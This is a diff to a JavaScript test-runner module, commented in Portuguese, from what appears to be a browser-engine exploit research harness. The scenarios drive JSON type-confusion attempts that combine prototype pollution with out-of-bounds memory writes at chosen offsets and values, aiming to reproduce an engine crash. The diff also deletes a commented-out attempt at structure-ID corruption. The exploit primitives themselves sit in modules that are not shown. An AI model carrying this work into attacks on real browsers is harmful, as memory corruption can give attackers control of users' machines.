@@ -2,128 +2,62 @@
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
 
-// Importamos a função modificada que permitirá mais controle
 import { runSpecificJsonTypeConfusionTest } from './testJsonTypeConfusionUAFSpeculative.mjs';
-// ... (outras importações)
-import { KNOWN_STRUCTURE_IDS } from '../config.mjs';
+// ... (outras importações como testWebAssemblyInterface, testSharedArrayBufferSupport, etc.)
+// import { KNOWN_STRUCTURE_IDS } from '../config.mjs'; // Descomente se for usar no futuro
 
+async function runTargetedJsonTCTests_WithRecursionControl() {
+    const FNAME_TARGETED_RUNNER = "runTargetedJsonTCTests_WithRecursionControl";
+    logS3(`==== INICIANDO TESTES DIRECIONADOS JSON TC COM CONTROLE DE RECURSÃO (S3) ====`, 'test', FNAME_TARGETED_RUNNER);
 
-// Nova função para executar cenários de teste de confusão de tipos isolados
-async function runAllIsolatedJsonTCTests() {
-    const FNAME_ISOLATED_RUNNER = "runAllIsolatedJsonTCTests";
-    logS3("==== INICIANDO BATERIA DE TESTES ISOLADOS: JSON Type Confusion (S3) ====", 'test', FNAME_ISOLATED_RUNNER);
-
-    // Cenário 1: Apenas Poluição de Protótipo (sem setup OOB e sem escrita OOB)
+    // Cenário 1: Tentativa de replicar o crash original (OOB write + PP)
+    // A função toJSON agora tem a lógica de modificar o retorno em profundidade crítica
     await runSpecificJsonTypeConfusionTest(
-        "OnlyPP_NoOOBSetup",    // description
-        -1,                     // corruptionOffset (inválido para não escrever)
-        0,                      // valueToWrite (irrelevante)
-        true,                   // enablePP
-        false,                  // attemptOOBWrite
-        true                    // skipOOBEnvironmentSetup <--- PULA triggerOOB_primitive
+        "ReplicarCrashOriginal_0x70_FFFF_PP_OOB_RecursionMod",
+        0x70,       // corruptionOffset
+        0xFFFFFFFF, // valueToWrite
+        true,       // enablePP
+        true,       // attemptOOBWrite
+        false       // skipOOBEnvironmentSetup
     );
     await PAUSE_S3(MEDIUM_PAUSE_S3);
 
-    // Cenário 2: Poluição de Protótipo COM setup OOB (mas sem escrita OOB)
-    // (Similar ao seu log IMG_20250520_115243.jpg)
+    // Cenário 2: Sem escrita OOB, mas com PP e controle de recursão no toJSON
+    // Para ver se a modificação do retorno do toJSON em profundidade causa problemas por si só
     await runSpecificJsonTypeConfusionTest(
-        "OnlyPP_WithOOBSetup",  // description
-        -1,                     // corruptionOffset (inválido para não escrever)
-        0,                      // valueToWrite (irrelevante)
-        true,                   // enablePP
-        false,                  // attemptOOBWrite
-        false                   // skipOOBEnvironmentSetup <--- FAZ triggerOOB_primitive
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-    // Cenário 3: Apenas Escrita OOB (sem poluição de protótipo)
-    await runSpecificJsonTypeConfusionTest(
-        "OnlyOOBWrite_0x70_FFFFFFFF", // description
-        0x70,                         // corruptionOffset
-        0xFFFFFFFF,                   // valueToWrite
-        false,                        // enablePP <--- PP Desabilitada
-        true,                         // attemptOOBWrite
-        false                         // skipOOBEnvironmentSetup
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-    // Cenário 4: Caso Original do Crash (PP Habilitada, Escrita OOB em 0x70 com 0xFFFFFFFF)
-    await runSpecificJsonTypeConfusionTest(
-        "OriginalCrash_0x70_FFFFFFFF_PP", // description
-        0x70,                             // corruptionOffset
-        0xFFFFFFFF,                       // valueToWrite
-        true,                             // enablePP
-        true,                             // attemptOOBWrite
-        false                             // skipOOBEnvironmentSetup
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
-
-    // Cenário 5: Variação de Valor (PP Habilitada, Escrita OOB em 0x70 com 0x0)
-    await runSpecificJsonTypeConfusionTest(
-        "Variant_0x70_0_PP",              // description
-        0x70,                             // corruptionOffset
-        0x0,                              // valueToWrite
-        true,                             // enablePP
-        true,                             // attemptOOBWrite
-        false                             // skipOOBEnvironmentSetup
+        "OnlyPP_RecursionMod_NoOOBWrite",
+        -1,         // corruptionOffset (inválido para não escrever)
+        0,          // valueToWrite (irrelevante)
+        true,       // enablePP
+        false,      // attemptOOBWrite
+        false       // skipOOBEnvironmentSetup (mas o OOBWrite é falso)
     );
     await PAUSE_S3(MEDIUM_PAUSE_S3);
     
-    // Cenário 6: Variação de Offset (PP Habilitada, Escrita OOB em 0x6C com 0xFFFFFFFF)
-    await runSpecificJsonTypeConfusionTest(
-        "Variant_0x6C_FFFFFFFF_PP",       // description
-        0x6C,                             // corruptionOffset
-        0xFFFFFFFF,                       // valueToWrite
-        true,                             // enablePP
-        true,                             // attemptOOBWrite
-        false                             // skipOOBEnvironmentSetup
-    );
-    await PAUSE_S3(MEDIUM_PAUSE_S3);
+    // Adicione mais cenários aqui. Por exemplo, tente diferentes valores para RECURSION_DEPTH_TARGET_FOR_MODIFICATION
+    // ou diferentes estruturas de retorno no toJSON (descomentando os Cenários A ou C lá).
 
-    // Adicione mais chamadas a runSpecificJsonTypeConfusionTest aqui com outras combinações
-    // Ex: Usando um StructureID candidato (lembre-se de converter para número)
-    // const idArrayBuffer = parseInt(KNOWN_STRUCTURE_IDS.TYPE_ARRAY_BUFFER, 16);
-    // if (!isNaN(idArrayBuffer)) {
-    //    await runSpecificJsonTypeConfusionTest(
-    //        `CorruptToTypeArrayBuffer_0x70_PP`,
-    //        0x70,
-    //        idArrayBuffer,
-    //        true,
-    //        true,
-    //        false
-    //    );
-    //    await PAUSE_S3(MEDIUM_PAUSE_S3);
-    // }
-
-
-    logS3("==== BATERIA DE TESTES ISOLADOS: JSON Type Confusion (S3) CONCLUÍDA ====", 'test', FNAME_ISOLATED_RUNNER);
+    logS3(`==== TESTES DIRECIONADOS JSON TC COM CONTROLE DE RECURSÃO CONCLUÍDOS ====`, 'test', FNAME_TARGETED_RUNNER);
 }
 
 
 export async function runAllAdvancedTestsS3() {
-    const FNAME = 'runAllAdvancedTestsS3_Modular';
+    const FNAME = 'runAllAdvancedTestsS3_FocusJsonTC_Recursion';
     const runBtn = getRunBtnAdvancedS3();
     const outputDiv = getOutputAdvancedS3();
 
     if (runBtn) runBtn.disabled = true;
     if (outputDiv) outputDiv.innerHTML = '';
 
-    logS3("==== INICIANDO Script 3: Testes Avançados Isolados (Foco em JSON TC) ====", 'test', FNAME);
+    logS3(`==== INICIANDO Script 3: Foco JSON TC c/ Controle de Recursão (S3) ====`,'test', FNAME);
     
-    await runAllIsolatedJsonTCTests(); // <<< EXECUTA A BATERIA DE TESTES ISOLADOS
+    await runTargetedJsonTCTests_WithRecursionControl(); // <<< EXECUTA OS NOVOS TESTES DIRECIONADOS
 
-    // Comente ou descomente os testes abaixo conforme necessário
+    // Outros testes podem ser comentados para focar
     // await testWebAssemblyInterface();
     // await PAUSE_S3(MEDIUM_PAUSE_S3);
-    // await testSharedArrayBufferSupport();
-    // await PAUSE_S3(MEDIUM_PAUSE_S3);
-    // explainMemoryPrimitives();
-    // await PAUSE_S3(SHORT_PAUSE_S3);
-    // await testCorruptArrayBufferStructure();
-    // await PAUSE_S3(MEDIUM_PAUSE_S3);
-    // await testCoreExploitModule(logS3); 
-    // await PAUSE_S3(MEDIUM_PAUSE_S3);
+    // ... etc ...
 
-    logS3("\n==== Script 3 CONCLUÍDO (Foco em Testes Avançados Isolados) ====", 'test', FNAME);
+    logS3(`\n==== Script 3 CONCLUÍDO (Foco JSON TC c/ Controle de Recursão) ====`,'test', FNAME);
     if (runBtn) runBtn.disabled = false;
 }
